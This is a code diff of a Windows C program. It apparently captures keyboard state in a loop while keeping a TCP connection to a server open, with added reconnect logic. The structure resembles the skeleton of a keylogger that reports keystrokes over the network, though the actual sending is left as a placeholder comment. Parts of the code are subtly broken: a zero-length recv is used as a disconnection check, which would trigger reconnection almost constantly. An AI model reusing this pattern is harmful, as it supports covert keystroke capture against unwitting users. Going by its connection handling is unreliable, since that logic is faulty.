@@ -9,45 +9,48 @@
 #define SERVER_ADDRESS "127.0.0.1"
 #define SERVER_PORT 80
 
+SOCKET sockfd;
+
 int send_data(const char *data, int length) {
-    // Initialize Winsock
+    int bytes_sent = send(sockfd, data, length, 0);
+    return bytes_sent;
+}
+
+void reconnect_to_server() {
+    // Close the socket and clean up
+    closesocket(sockfd);
+    WSACleanup();
+    
+    // Re-establish the connection to the server
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         // Error handling if WSAStartup fails
-        return -1;
+        return;
     }
-
-    // Create a socket for connecting to the server
-    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    
+    // Create a new socket for connecting to the server
+    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sockfd == INVALID_SOCKET) {
         // Error handling if socket creation fails
         WSACleanup();
-        return -1;
+        return;
     }
-
+    
     // Resolve the server address
     struct sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(SERVER_PORT);
     InetPton(AF_INET, SERVER_ADDRESS, &serverAddr.sin_addr);
-
+    
     // Connect to the server
     if (connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
         // Error handling if connection fails
         closesocket(sockfd);
         WSACleanup();
-        return -1;
+        return;
     }
-
-    // Send the data to the server
-    int bytes_sent = send(sockfd, data, length, 0);
-
-    // Close the socket and clean up
-    closesocket(sockfd);
-    WSACleanup();
-
-    // Return the number of bytes sent
-    return bytes_sent;
+    
+    printf("Connection to the server was closed. Reconnected successfully.\n");
 }
 
 int get_keyboard_state() {
@@ -87,4 +90,59 @@ int get_keyboard_state() {
 
     // Return the result as a bitfield with 4 bits
     return result;
+}
+
+int main() {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        // Error handling if WSAStartup fails
+        return 1;
+    }
+
+    // Create a socket for connecting to the server
+    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sockfd == INVALID_SOCKET) {
+        // Error handling if socket creation fails
+        WSACleanup();
+        return 1;
+    }
+
+    // Resolve the server address
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(SERVER_PORT);
+    InetPton(AF_INET, SERVER_ADDRESS, &serverAddr.sin_addr);
+
+    // Connect to the server
+    if (connect(sockfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
+        // Error handling if connection fails
+        closesocket(sockfd);
+        WSACleanup();
+        return 1;
+    }
+
+    // Main loop
+    while (1) {
+        int keyboard_state = get_keyboard_state();
+        if (keyboard_state == -1) {
+            printf("Error capturing keyboard state.\n");
+            break;
+        }
+        
+        // ... Do something with the captured keyboard state ...
+        
+        // Check if the connection to the server was closed
+        int bytes_received = recv(sockfd, NULL, 0, 0);
+        if (bytes_received == 0) {
+            printf("Connection to the server was closed. Attempting to reconnect...\n");
+            reconnect_to_server();
+        }
+    }
+
+    // Close the socket and clean up
+    closesocket(sockfd);
+    WSACleanup();
+
+    return 0;
 }
